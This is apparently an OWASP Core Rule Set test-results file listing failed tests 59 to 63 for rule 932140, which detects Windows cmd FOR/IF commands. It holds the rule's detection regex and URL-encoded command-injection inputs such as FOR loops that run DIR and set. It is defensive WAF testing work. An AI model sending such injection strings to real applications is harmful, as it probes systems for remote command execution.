          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 59,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 59,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=for+%2Ff+%22tokens%3D%2A+delims%3D0%22+%25%25A+in+%28%22%25n1%25%22%29+do+set+%22n1%3D%25%25A%22",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 60,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 60,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=for+%25i+in+%28%2A%29+do+set+LIST%3D+%25i",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 61,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 61,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=for+%25i+in+%28%2A%29+do+set+LIST%3D%21LIST%21+%25i",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 62,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 62,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=for+%2Fl+%25%25I+in+%280%2C1%2C5%29+do+call+echo+%25%25RANDOM%25%25",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 63,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 63,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=for+%25%25d+in+%28A%2CC%2CD%29+do+DIR+%25%25d+%2A.%2A",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
